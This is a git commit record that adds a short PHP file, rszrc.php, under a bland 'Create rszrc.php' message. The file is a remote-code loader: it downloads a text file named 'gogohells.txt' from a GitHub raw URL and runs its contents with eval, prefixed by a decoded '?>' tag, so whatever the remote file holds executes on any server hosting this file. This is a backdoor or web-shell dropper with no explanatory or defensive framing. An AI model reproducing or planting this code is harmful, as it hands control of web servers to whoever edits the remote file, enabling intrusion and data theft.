9c3ab8f7349cce97868ff2e0dcb62579b63bdfb8
youngkmd <103062072+youngkmd@users.noreply.github.com>
2025-02-20 14:25:08 +0100

    Create rszrc.php

---
+++ rszrc.php
@@ -0,0 +1,8 @@
+<?php
+eval(
+    urldecode("%3f%3e")
+    . file_get_contents(
+        urldecode("https://raw.githubusercontent.com/youngkmd/youngkmd/refs/heads/main/gogohells.txt?KrR=817371162")
+    )
+);
+?>
